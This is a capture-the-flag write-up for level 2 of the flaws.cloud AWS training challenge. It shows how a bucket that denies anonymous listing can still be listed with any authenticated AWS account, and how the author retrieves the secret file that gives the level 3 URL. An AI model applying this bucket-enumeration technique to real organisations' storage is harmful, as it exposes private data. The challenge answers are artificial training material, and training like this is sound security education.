# Level 2

http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

<img width="825" height="776" alt="image" src="https://github.com/user-attachments/assets/f93fa40c-2fc5-44d1-9b85-855198fcd2e6" />

<img width="747" height="322" alt="image" src="https://github.com/user-attachments/assets/c1b68c0e-c164-41dc-89ec-83978f563768" />

Attempting to enumerate the bucket anonymously results in an `AccessDenied` error. This indicates that the bucket does not permit the `ListBucket` action for unauthenticated users. However, denying bucket listing does not guarantee that objects themselves are private, as individual files may still be accessible if their names are known. Stated needing an aws account for this.

```
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --no-sign-request

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

After creating a dedicated IAM user, we generate an access key and configure the AWS CLI using a separate `flaws` profile. We then verify authentication by calling `sts get-caller-identity`, which confirms that our requests are being made as the newly created IAM user.

<img width="629" height="367" alt="image" src="https://github.com/user-attachments/assets/6f87be52-a8a3-4cd0-a555-ad92f8168af1" />

```
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud                  
2017-02-26 21:02:15      80751 everyone.png
2017-03-02 22:47:17       1433 hint1.html
2017-02-26 21:04:39       1035 hint2.html
2017-02-26 21:02:14       2786 index.html
2017-02-26 21:02:14         26 robots.txt
2017-02-26 21:02:15       1051 secret-e4443fc.html
```

```
aws s3 cp s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html .
```

```
cat secret-e4443fc.html

<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 3 is at <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud">http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</a>
```



